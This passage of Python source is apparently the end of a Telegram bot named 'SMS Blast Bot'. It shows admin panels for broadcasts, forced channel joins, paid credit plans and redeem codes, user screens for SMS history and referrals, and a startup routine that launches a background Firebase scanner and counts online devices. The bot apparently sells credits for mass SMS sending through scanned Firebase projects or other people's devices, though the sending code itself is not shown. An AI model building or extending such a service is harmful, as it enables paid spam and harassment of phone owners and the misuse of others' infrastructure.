    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage bhejein:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", back, EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    sem = asyncio.Semaphore(20)
    ok = fail = 0
    lock = asyncio.Lock()

    async def send_one(uid_str: str):
        nonlocal ok, fail
        async with sem:
            try:
                target = int(uid_str)
                if msg.text:
                    await msg.bot.send_message(target, f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}", parse_mode="HTML")
                else:
                    await msg.copy_to(target)
                async with lock:
                    ok += 1
            except Exception:
                async with lock:
                    fail += 1

    await asyncio.gather(*(send_one(u) for u in list(users.keys())))
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b> | Failed: <b>{fail}</b>", reply_markup=back_kb, parse_mode="HTML")

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer()
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        await cq.message.reply_document(document=FSInputFile(script_path), caption=f"📤 <b>{_VERSION}</b>", parse_mode="HTML")
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.clear()
    d = load()
    if is_admin(cq.from_user.id, d):
        try:
            await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        except TelegramBadRequest:
            pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await cq.answer("🔄 Loading...")
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    devices = get_cached_devices() or await get_all_online_devices(d)
    full = (api_stats_text(d) + f"\n\n🟢 Online Devices: <b>{len(devices)}</b>")[:3990]
    try:
        await cq.message.edit_text(
            full,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                btn("ʀᴇғʀᴇsʜ", "admin:stats", EMOJI_GEAR, "🔄", style="primary"),
                btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="primary")
            ]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\nStatus: {'🟢 ON' if fj.get('enabled') else '🔴 OFF'} | Channels: <b>{len(channels)}</b>"
    rows = [
        [
            btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success"),
            btn("ʀᴇᴍᴏᴠᴇ", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")
        ],
        [btn("ᴛᴏɢɢʟᴇ ᴏɴ/ᴏғғ", "owner:fj:toggle", EMOJI_BELL, "🔄", style="primary")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    if not is_owner(cq.from_user.id, load()):
        return
    await state.set_state(S.fj_add_channel)
    try:
        await cq.message.edit_text(
            "Channel/Group ID bhejein (e.g. -1001234567890):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:fj:menu", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    try:
        ch_id = int(msg.text.strip())
    except Exception:
        await msg.answer("❌ Valid channel ID bhejein.", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        "Invite link bhejein (https://...):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:fj:menu", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ Valid link bhejein.", parse_mode="HTML")
        return
    ch_id = str((await state.get_data()).get("fj_channel_id"))
    try:
        title = (await msg.bot.get_chat(int(ch_id))).title or "Channel"
    except Exception:
        title = "Channel"
    channels = [c for c in d.setdefault("force_join", {}).setdefault("channels", []) if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Added <b>{title}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    channels = load().get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi!", show_alert=True)
        return
    await cq.answer()
    rows = [[btn(ch.get("title", "Channel")[:25], f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑", style="danger")] for ch in channels]
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text("Remove Channel:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    d["force_join"]["channels"] = [c for c in d.get("force_join", {}).get("channels", []) if str(c["id"]) != ch_id]
    save(d)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans ({len(plans)})</b>\n\n" + "\n".join(
        f"{i}. <b>{p['name']}</b> — {p['price']} INR = {p['credits']} credits" for i, p in enumerate(plans, 1)
    )
    rows = [
        [
            btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕", style="success"),
            btn("ʀᴇᴍᴏᴠᴇ", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")
        ],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.add_plan_name)
    try:
        await cq.message.edit_text(
            "Plan ka naam bhejein:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        "Price bhejein:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    try:
        await state.update_data(plan_price=float(msg.text.strip()))
    except Exception:
        await msg.answer("❌ Valid price bhejein.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        "Kitne credits dena hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    try:
        await state.update_data(plan_credits=int(msg.text.strip()))
    except Exception:
        await msg.answer("❌ Valid number bhejein.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        "Payment link bhejein (https://...):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ Valid URL bhejein.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    d.setdefault("pricing", {}).setdefault("plans", []).append({
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    })
    save(d)
    await state.clear()
    await msg.answer(
        "✅ Plan Added!",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    plans = load().get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi!", show_alert=True)
        return
    await cq.answer()
    rows = [[btn(p["name"][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑", style="danger")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text("Remove Plan:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    d["pricing"]["plans"] = [p for p in d.get("pricing", {}).get("plans", []) if p["id"] != plan_id]
    save(d)
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    codes = load().get("redeem_codes", {})
    lines = [f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes ({len(codes)})</b>\n"]
    for code, data in list(codes.items())[:10]:
        lines.append(f"<code>{code}</code> — 💰{data['credits']} ({data.get('uses_left', 0)} left)")
    rows = [
        [
            btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success"),
            btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")
        ],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.gen_redeem_credits)
    try:
        await cq.message.edit_text(
            "Kitne credits dena hai?",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:redeem:menu", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    try:
        await state.update_data(gen_credits=int(msg.text.strip()))
    except Exception:
        await msg.answer("❌ Valid number bhejein.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        "Kitni baar use ho sakta hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:redeem:menu", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    try:
        uses = int(msg.text.strip())
        if uses < 1:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid number bhejein.", parse_mode="HTML")
        return
    credits = (await state.get_data()).get("gen_credits", 10)
    code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    d.setdefault("redeem_codes", {})[code] = {"credits": credits, "uses_left": uses, "created_by": msg.from_user.id, "created_at": int(time.time()), "used_by": []}
    save(d)
    await state.clear()
    await msg.answer(
        f"🎉 Code Generated: <code>{code}</code> (💰{credits} x {uses})",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    codes = load().get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi!", show_alert=True)
        return
    await cq.answer()
    rows = [[btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑", style="danger")] for code in list(codes.keys())[:20]]
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text("Delete Code:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    d.get("redeem_codes", {}).pop(code, None)
    save(d)
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.add_credits_uid)
    try:
        await cq.message.edit_text(
            "User ID bhejein:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    try:
        await state.update_data(credit_uid=int(msg.text.strip()))
    except Exception:
        await msg.answer("❌ Valid ID bhejein.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        "Kitne credits add karne hain?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    try:
        amount = int(msg.text.strip())
    except Exception:
        await msg.answer("❌ Valid number bhejein.", parse_mode="HTML")
        return
    uid = (await state.get_data()).get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(uid, f"💰 Aapko +{amount} credits mile hain!", parse_mode="HTML")
    except Exception:
        pass
    await msg.answer(
        f"✅ Added <b>{amount}</b> credits to <code>{uid}</code>.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.deduct_credits_uid)
    try:
        await cq.message.edit_text(
            "User ID bhejein:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    try:
        await state.update_data(deduct_uid=int(msg.text.strip()))
    except Exception:
        await msg.answer("❌ Valid ID bhejein.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        "Kitne credits deduct karne hain?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    try:
        amount = int(msg.text.strip())
    except Exception:
        await msg.answer("❌ Valid number bhejein.", parse_mode="HTML")
        return
    uid = (await state.get_data()).get("deduct_uid")
    ok = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Deducted <b>{amount}</b> from <code>{uid}</code>." if ok else "❌ Insufficient credits.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    settings = load().get("settings", {})
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁", style="primary")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    try:
        await cq.message.edit_text(f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\nRef Credits: <b>{settings.get('ref_credits', 3)}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.set_ref_credits)
    try:
        await cq.message.edit_text(
            "Referral pe kitne credits dena hai?",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:settings", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    try:
        credits = int(msg.text.strip())
        if credits < 0:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid number bhejein.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Referral Credits set to <b>{credits}</b>.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:settings", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    entries = load().get("activity_log", [])[-20:]
    lines = [f"[{fmt_time(e.get('timestamp', 0))}] <code>{e.get('uid', 0)}</code> — <b>{e.get('action')}</b> — {e.get('details', '')}" for e in reversed(entries)]
    try:
        await cq.message.edit_text(
            ("\n".join(lines) or "<i>Koi activity nahi.</i>")[:3990],
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    total = sum(len(v) for v in load().get("sms_history", {}).values())
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total}</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest:
            pass
        return
    try:
        if is_owner(uid, d):
            await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        elif is_admin(uid, d):
            await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        elif can_use(uid, d):
            await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
        else:
            await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    await cq.answer(f"💰 Credits: {get_user_credits(cq.from_user.id, load())}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.redeem_code)
    try:
        await cq.message.edit_text(
            "Redeem code bhejein:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    code_data = d.get("redeem_codes", {}).get(code)
    if not code_data or code_data.get("uses_left", 0) <= 0 or uid in code_data.get("used_by", []):
        await msg.answer(
            "❌ Invalid / Expired / Already Used code!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]]),
            parse_mode="HTML"
        )
        return
    add_credits(uid, code_data["credits"], d)
    code_data["uses_left"] -= 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"🎉 +{code_data['credits']} credits added! Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    me = await cq.bot.get_me()
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\nCode: <code>{code}</code>\nLink: https://t.me/{me.username}?start={code}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\nCredits: <b>{udata.get('credits', 0)}</b>\nSent: <b>{udata.get('uses', 0)}</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    history = load().get("sms_history", {}).get(str(cq.from_user.id), [])[-10:]
    lines = [f"{i}. [{fmt_time(e.get('timestamp', 0))}] <code>{mask_number(e.get('number', ''))}</code> — {e.get('status')}" for i, e in enumerate(reversed(history), 1)]
    try:
        await cq.message.edit_text(
            "\n".join(lines) or "<i>Koi SMS history nahi.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    plans = load().get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan available nahi!", show_alert=True)
        return
    await cq.answer()
    rows = [[btn_url(f"Buy {sc(p['name'][:20])}", p["payment_link"], EMOJI_MONEY, "💳", style="success")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    text = "\n".join(f"• <b>{p['name']}</b>: {p['price']} INR = {p['credits']} credits" for p in plans)
    try:
        await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n{text}", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\nOwner: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

async def main():
    load()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception as e:
        log.warning(f"Webhook drop warning: {e}")

    asyncio.create_task(background_firebase_scanner(bot))
    asyncio.create_task(background_auto_user_messenger(bot))

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"• Firebase Scanner: <b>45s</b>\n"
            f"• Auto 1-Min User Msg + Auto Delete Prev: <b>READY</b>\n"
            f"• Bad/Expired Firebase Cleaner: <b>READY</b>\n"
            f"• Owner: {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        if _HTTP_SESSION and not _HTTP_SESSION.closed:
            await _HTTP_SESSION.close()

if __name__ == "__main__":
    asyncio.run(main())
